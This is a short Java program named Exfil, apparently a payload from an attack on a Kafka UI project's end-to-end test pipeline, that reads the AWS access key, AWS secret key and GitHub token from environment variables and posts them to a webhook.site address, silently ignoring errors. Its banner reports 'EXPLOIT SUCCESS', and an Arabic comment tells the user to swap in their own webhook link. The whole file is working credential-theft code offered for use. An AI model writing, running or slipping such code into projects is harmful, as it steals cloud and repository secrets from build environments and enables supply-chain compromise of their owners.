public class Exfil {
    public static void main(String[] args) {
        StringBuilder data = new StringBuilder("[+] KAFKA-UI E2E EXPLOIT SUCCESS\n");
        data.append("Time: ").append(new java.util.Date()).append("\n\n");

        String[] secrets = {
            "S3_AWS_ACCESS_KEY_ID",
            "S3_AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN"
        };

        for (String s : secrets) {
            String value = System.getenv(s);
            if (value != null && !value.trim().isEmpty()) {
                data.append(s).append(" = ").append(value).append("\n");
            }
        }

        // إرسال البيانات إلى webhook (غير الرابط ده)
        try {
            java.net.URL url = new java.net.URL("https://webhook.site/baa97992-65f4-4e29-a57e-e1f0b3ed39b1"); 
            java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            con.getOutputStream().write(data.toString().getBytes("UTF-8"));
            con.getResponseCode();
        } catch (Exception ignored) {}
    }
}
